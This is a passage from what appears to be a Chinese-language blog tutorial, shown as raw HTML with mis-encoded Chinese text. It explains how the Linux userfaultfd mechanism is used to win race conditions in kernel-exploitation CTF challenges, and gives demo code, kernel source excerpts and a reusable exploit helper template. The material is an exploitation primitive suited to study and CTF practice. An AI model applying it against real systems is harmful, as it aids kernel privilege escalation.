class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>æœ‰äººå¯èƒ½æ³¨æ„åˆ°äº† <code>uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &amp; ~(page_size - 1);</code> è¿™ä¸ªå¥‡æ€ªçš„å¥å­ï¼Œåœ¨è¿™é‡Œä½œç”¨æ˜¯å°†è§¦å‘ç¼ºé¡µå¼‚å¸¸çš„åœ°å€<strong>æŒ‰é¡µå¯¹é½</strong>ä½œä¸ºåç»­æ‹·è´çš„èµ·å§‹åœ°å€</p><blockquote><p>æ¯”å¦‚è¯´è§¦å‘çš„åœ°å€å¯èƒ½æ˜¯ 0xdeadbeefï¼Œç›´æ¥ä»è¿™é‡Œå¼€å§‹æ‹·è´ä¸€æ•´é¡µçš„æ•°æ®å°±æ‹·æ­ªäº†ï¼Œåº”å½“ä» 0xdeadb000 å¼€å§‹æ‹·è´ï¼ˆå‡è®¾é¡µå¤§å° 0x1000ï¼‰</p></blockquote><h4 id="ä¾‹ç¨‹"><a href="#ä¾‹ç¨‹" class="headerlink" title="ä¾‹ç¨‹"></a>ä¾‹ç¨‹</h4><p>æµ‹è¯•ä¾‹ç¨‹å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;poll.h&gt;</span></span><br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> page_size;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *arg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span>   <span class="hljs-comment">/* Data read from userfaultfd */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> fault_cnt = <span class="hljs-number">0</span>;     <span class="hljs-comment">/* Number of faults so far handled */</span><br>    <span class="hljs-keyword">long</span> uffd;                    <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-keyword">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-keyword">long</span>) arg;<br><br>    <span class="hljs-comment">/* Create a page that will be copied into the faulting region */</span><br><br>    <span class="hljs-keyword">if</span> (page == <span class="hljs-literal">NULL</span>) <br>    &#123;<br>        page = mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE,<br>                    MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">if</span> (page == MAP_FAILED)<br>            errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* Loop, handling incoming events on the userfaultfd</span><br><span class="hljs-comment">        file descriptor */</span><br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-comment">/* See what poll() tells us about the userfaultfd */</span><br><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-keyword">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nfault_handler_thread():\n&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    poll() returns: nready = %d; &quot;</span><br>                <span class="hljs-string">&quot;POLLIN = %d; POLLERR = %d\n&quot;</span>, nready,<br>                (pollfd.revents &amp; POLLIN) != <span class="hljs-number">0</span>,<br>                (pollfd.revents &amp; POLLERR) != <span class="hljs-number">0</span>);<br><br>        <span class="hljs-comment">/* Read an event from the userfaultfd */</span><br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-comment">/* We expect only one kind of event; verify that assumption */</span><br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>        &#123;<br>            <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br>            <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>        &#125;<br>        <span class="hljs-comment">/* Display info about the page-fault event */</span><br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;    UFFD_EVENT_PAGEFAULT event: &quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;flags = %llx; &quot;</span>, msg.arg.pagefault.flags);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;address = %llx\n&quot;</span>, msg.arg.pagefault.address);<br><br>        <span class="hljs-comment">/* Copy the page pointed to by &#x27;page&#x27; into the faulting</span><br><span class="hljs-comment">            region. Vary the contents that are copied in, so that it</span><br><span class="hljs-comment">            is more obvious that each fault is handled separately. */</span><br><br>        <span class="hljs-built_in">memset</span>(page, <span class="hljs-string">&#x27;A&#x27;</span> + fault_cnt % <span class="hljs-number">20</span>, page_size);<br>        fault_cnt++;<br><br>        uffdio_copy.src = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) page;<br><br>        <span class="hljs-comment">/* We need to handle page faults in units of pages(!).</span><br><span class="hljs-comment">        So, round faulting address down to page boundary */</span><br><br>        uffdio_copy.dst = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;        (uffdio_copy.copy returned %lld)\n&quot;</span>,<br>               uffdio_copy.copy);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> ** argv, <span class="hljs-keyword">char</span> ** envp)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> uffd;          <span class="hljs-comment">/* userfaultfd file descriptor */</span><br>    <span class="hljs-keyword">char</span> *addr;         <span class="hljs-comment">/* Start of region handled by userfaultfd */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len;  <span class="hljs-comment">/* Length of region handled by userfaultfd */</span><br>    <span class="hljs-keyword">pthread_t</span> thr;      <span class="hljs-comment">/* ID of thread that handles page faults */</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br><br>    page_size = sysconf(_SC_PAGE_SIZE);<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a private anonymous mapping. The memory will be</span><br><span class="hljs-comment">        demand-zero paged--that is, not yet allocated. When we</span><br><span class="hljs-comment">        actually touch the memory, it will be allocated via</span><br><span class="hljs-comment">        the userfaultfd. */</span><br>    len = <span class="hljs-number">0x1000</span>;<br>    addr = (<span class="hljs-keyword">char</span>*) mmap(<span class="hljs-literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (addr == MAP_FAILED)<br>        errExit(<span class="hljs-string">&quot;mmap&quot;</span>);<br><br>    <span class="hljs-comment">/* Register the memory range of the mapping we just created for</span><br><span class="hljs-comment">    handling by the userfaultfd object. In mode, we request to track</span><br><span class="hljs-comment">    missing pages (i.e., pages that have not yet been faulted in). */</span><br><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    <span class="hljs-comment">/* Create a thread that will process the userfaultfd events */</span><br>    <span class="hljs-keyword">int</span> s = pthread_create(&amp;thr, <span class="hljs-literal">NULL</span>, fault_handler_thread, (<span class="hljs-keyword">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br><br>    <span class="hljs-comment">/* Trigger the userfaultfd event */</span><br>    <span class="hljs-keyword">void</span> * ptr = (<span class="hljs-keyword">void</span>*) *(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> <span class="hljs-keyword">long</span>*) addr;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Get data: %p\n&quot;</span>, ptr);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>èµ·ä¸ªè™šæ‹Ÿæœºè·‘ä¸€ä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨æˆ‘ä»¬ç›‘è§†çš„åŒ¿åé¡µå†…æˆåŠŸåœ°è¢«æˆ‘ä»¬å†™å…¥äº†æƒ³è¦çš„æ•°æ®</p><p><a href="https://i.loli.net/2021/09/08/7iQO1b64XNaTkG8.png"><img src="https://s2.loli.net/2023/02/06/vqNE8LfA1swbMgU.png" alt="img"></a></p><h3 id="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—-userfaultfd-åœ¨-race-condition-ä¸­çš„åˆ©ç”¨"><a href="#æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ—-userfaultfd-åœ¨-race-condition-ä¸­çš„åˆ©ç”¨" class="headerlink" title="æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ— userfaultfd åœ¨ race condition ä¸­çš„åˆ©ç”¨"></a>æ–°ç‰ˆæœ¬å†…æ ¸å¯¹æŠ— userfaultfd åœ¨ race condition ä¸­çš„åˆ©ç”¨</h3><p>æ­£æ‰€è°“â€œæ²¡æœ‰ä¸‡èƒ½çš„é“¶å¼¹â€ï¼Œå¯èƒ½æœ‰çš„äººä¼šå‘ç°åœ¨è¾ƒæ–°ç‰ˆæœ¬çš„å†…æ ¸ä¸­ userfaultfd ç³»ç»Ÿè°ƒç”¨æ— æ³•æˆåŠŸå¯åŠ¨ï¼š</p><p><a href="https://i.loli.net/2021/09/08/e2LRJKzQVYSTO5k.png"><img src="https://s2.loli.net/2023/02/06/N8yozIhODSZ4A3V.png" alt="image.png"></a></p><p>è¿™æ˜¯å› ä¸ºåœ¨è¾ƒæ–°ç‰ˆæœ¬çš„å†…æ ¸ä¸­ä¿®æ”¹äº†å˜é‡ <code>sysctl_unprivileged_userfaultfd</code> çš„å€¼ï¼š</p><blockquote><p>æ¥è‡ª linux-5.11 æºç <code>fs/userfaultfd.c</code>ï¼š</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">int</span> sysctl_unprivileged_userfaultfd __read_mostly;<br><span class="hljs-comment">//...</span><br>SYSCALL_DEFINE1(userfaultfd, <span class="hljs-keyword">int</span>, flags)<br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">userfaultfd_ctx</span> *<span class="hljs-title">ctx</span>;</span><br>    <span class="hljs-keyword">int</span> fd;<br><br>    <span class="hljs-keyword">if</span> (!sysctl_unprivileged_userfaultfd &amp;&amp;<br>        (flags &amp; UFFD_USER_MODE_ONLY) == <span class="hljs-number">0</span> &amp;&amp;<br>        !capable(CAP_SYS_PTRACE)) &#123;<br>        printk_once(KERN_WARNING <span class="hljs-string">&quot;uffd: Set unprivileged_userfaultfd &quot;</span><br>            <span class="hljs-string">&quot;sysctl knob to 1 if kernel faults must be handled &quot;</span><br>            <span class="hljs-string">&quot;without obtaining CAP_SYS_PTRACE capability\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> -EPERM;<br>    &#125;<br><span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><blockquote><p>æ¥è‡ª linux-5.4 æºç <code>fs/userfaultfd.c</code>ï¼š</p></blockquote><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">int</span> sysctl_unprivileged_userfaultfd __read_mostly = <span class="hljs-number">1</span>;<br><span class="hljs-comment">//...</span><br></code></pre></div></td></tr></table></figure><p>åœ¨ä¹‹å‰çš„ç‰ˆæœ¬å½“ä¸­ <code>sysctl_unprivileged_userfaultfd</code> è¿™ä¸€å˜é‡è¢«åˆå§‹åŒ–ä¸º <code>1</code>ï¼Œè€Œåœ¨è¾ƒæ–°ç‰ˆæœ¬çš„å†…æ ¸å½“ä¸­è¿™ä¸€å˜é‡å¹¶æ²¡æœ‰è¢«èµ‹äºˆåˆå§‹å€¼ï¼Œ<strong>ç¼–è¯‘å™¨ä¼šå°†å…¶æ”¾åœ¨ bss æ®µï¼Œé»˜è®¤å€¼ä¸º 0</strong></p><p>è¿™æ„å‘³ç€åœ¨è¾ƒæ–°ç‰ˆæœ¬å†…æ ¸ä¸­<strong>åªæœ‰ root æƒé™æ‰èƒ½ä½¿ç”¨ userfaultfd</strong>ï¼Œè¿™æˆ–è®¸æ„å‘³ç€åˆšåˆšè¿›å…¥å¤§ä¼—è§†é‡çš„ userfaultfd å¯èƒ½åˆå°†é€æ¸æ·¡å‡ºå¤§ä¼—è§†é‡ï¼ˆ<del>å¾®åš@æ¥å»ä¹‹é—´</del>ï¼‰ï¼Œä½†ä¸å¯å¦è®¤çš„æ˜¯ï¼Œuserfaultfd ç¡®ä¹ä¸ºæˆ‘ä»¬åœ¨ Linux kernel ä¸­çš„æ¡ä»¶ç«äº‰åˆ©ç”¨æä¾›äº†ä¸€ä¸ªå…¨æ–°çš„æ€è·¯ä¸ä¸€ç§æå…¶ç¨³å®šçš„åˆ©ç”¨æ‰‹æ³•</p><h3 id="CTF-ä¸­çš„-userfaultfd-æ¿å­"><a href="#CTF-ä¸­çš„-userfaultfd-æ¿å­" class="headerlink" title="CTF ä¸­çš„ userfaultfd æ¿å­"></a>CTF ä¸­çš„ userfaultfd æ¿å­</h3><p>userfaultfd çš„æ•´ä¸ªæ“ä½œæµç¨‹æ¯”è¾ƒç¹çï¼Œæ•…ç¬”è€…ç°ç»™å‡ºå¦‚ä¸‹æ¿å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">static</span> <span class="hljs-keyword">pthread_t</span> monitor_thread;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">errExit</span><span class="hljs-params">(<span class="hljs-keyword">char</span> * msg)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Error at: %s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-keyword">void</span> * addr, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> len, <span class="hljs-keyword">void</span> (*handler)(<span class="hljs-keyword">void</span>*))</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-keyword">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, handler, (<span class="hljs-keyword">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>åœ¨ä½¿ç”¨æ—¶ç›´æ¥è°ƒç”¨å³å¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C">registerUserFaultFd(addr, len, handler);<br></code></pre></div></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ handler çš„å†™æ³•ï¼Œè¿™é‡Œç›´æ¥ç…§æŠ„ Linux man page æ”¹äº†æ”¹ï¼Œå¯ä»¥æ ¹æ®ä¸ªäººéœ€æ±‚è¿›è¡Œä¸ªæ€§åŒ–æ”¹åŠ¨ï¼š</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs C"><span class="hljs-keyword">static</span> <span class="hljs-keyword">char</span> *page = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// ä½ è¦æ‹·è´è¿›å»çš„æ•°æ®</span><br><span 